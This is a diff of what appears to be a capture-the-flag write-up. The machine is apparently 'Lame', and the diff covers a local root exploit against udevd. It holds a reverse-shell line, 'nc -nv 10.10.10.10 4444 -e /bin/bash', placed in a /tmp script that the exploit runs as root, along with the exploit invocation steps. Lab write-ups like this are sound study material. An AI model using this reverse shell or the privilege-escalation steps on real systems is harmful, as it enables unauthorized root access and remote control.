@@ -26,7 +26,9 @@ It require process id of udevd : ps -aux |grep devd
 As per this exploit the file run in tmp directory will be running with root priviledges.
 
 run
+
 #/bin/bash
+
 nc -nv 10.10.10.10 4444 -e /bin/bash
 
 transfer the file run in tmp directory and run these commands 
@@ -34,6 +36,9 @@ transfer the file run in tmp directory and run these commands
 ./8572 2688 (as per my pc udevd PID. It can be differet for yours)
 
 and we get reverse connection on netcat at port 4444
+
+![Lame_flag](https://user-images.githubusercontent.com/55708909/91435348-d0395700-e883-11ea-8208-97d55095c9a1.png)
+
 
 
 
